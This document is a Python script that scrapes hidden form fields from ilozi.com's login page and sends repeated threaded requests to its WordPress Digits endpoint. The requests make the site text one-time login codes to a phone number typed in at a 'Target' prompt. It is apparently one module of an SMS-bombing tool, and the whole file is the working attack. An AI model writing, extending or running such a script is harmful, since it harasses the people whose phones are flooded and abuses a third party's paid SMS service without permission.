import requests
from bs4 import BeautifulSoup
from threading import Thread
from time import sleep
import re

# Colors
r = '\033[31;1m'
g = '\033[32;1m'
y = '\033[33;1m'
p = '\033[35;1m'
a = '\033[0m'

# Slow print
def print_slow(text, delay=0.005):
    for char in text:
        print(char, end='', flush=True)
        sleep(delay)
    print()

# Extract dynamic fields from HTML
def extract_fields(session):
    url = "https://ilozi.com/?login=true"
    resp = session.get(url)
    soup = BeautifulSoup(resp.text, "html.parser")
    scripts = soup.find_all("script")
    
    instance_id = None
    digits_form = None
    for script in scripts:
        text = script.get_text()
        if "instance_id" in text:
            m = re.search(r'instance_id\s*[:=]\s*["\'](\w+)["\']', text)
            if m:
                instance_id = m.group(1)
        if "digits_form" in text:
            m2 = re.search(r'digits_form\s*[:=]\s*["\'](\w+)["\']', text)
            if m2:
                digits_form = m2.group(1)
    return instance_id, digits_form

# Send SMS
def ilozi_send(phone):
    session = requests.Session()
    try:
        instance_id, digits_form = extract_fields(session)
        if not instance_id or not digits_form:
            print(f"{r}[-] Failed to extract dynamic fields{a}")
            return

        url = "https://ilozi.com/wp-admin/admin-ajax.php"
        payload = {
            "login_digt_countrycode": "+98",
            "digits_phone": phone,
            "action_type": "phone",
            "digits": "1",
            "instance_id": instance_id,
            "action": "digits_forms_ajax",
            "type": "login",
            "digits_step_1_type": "",
            "digits_step_1_value": "",
            "digits_step_2_type": "",
            "digits_step_2_value": "",
            "digits_step_3_type": "",
            "digits_step_3_value": "",
            "digits_login_email_token": "",
            "digits_redirect_page": "https://ilozi.com/my-account/?action=register",
            "digits_form": digits_form,
            "_wp_http_referer": "/?login=true",
            "show_force_title": "1"
        }
        headers = {
            "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
            "Accept": "*/*",
            "X-Requested-With": "XMLHttpRequest",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        }

        resp = session.post(url, data=payload, headers=headers, timeout=5)
        if resp.status_code == 200 and ("success" in resp.text.lower() or "sent" in resp.text.lower()):
            print(f"{g}[+] SMS Sent to {phone}{a}")
        else:
            print(f"{y}[-] Request sent but response may not be successful{a}")

    except Exception as e:
        print(f"{r}[!] Exception: {e}{a}")

# Run multiple threads
def run_test(phone, delay=1, count=3):
    print_slow(f"{p}╔═════[ Ilozi SMS Test ]═════╗")
    print_slow(f"{g}Target: {y}{phone}")
    print_slow(f"{g}Delay between requests: {y}{delay}s")
    print_slow(f"{g}Total Attempts: {y}{count}")
    print_slow(f"{p}╚════════════════════════════╝")
    
    for i in range(count):
        Thread(target=ilozi_send, args=(phone,)).start()
        sleep(delay)

if __name__ == "__main__":
    phone = input("Enter your phone (e.g. 9173644430): ")
    run_test(phone, delay=1, count=3)
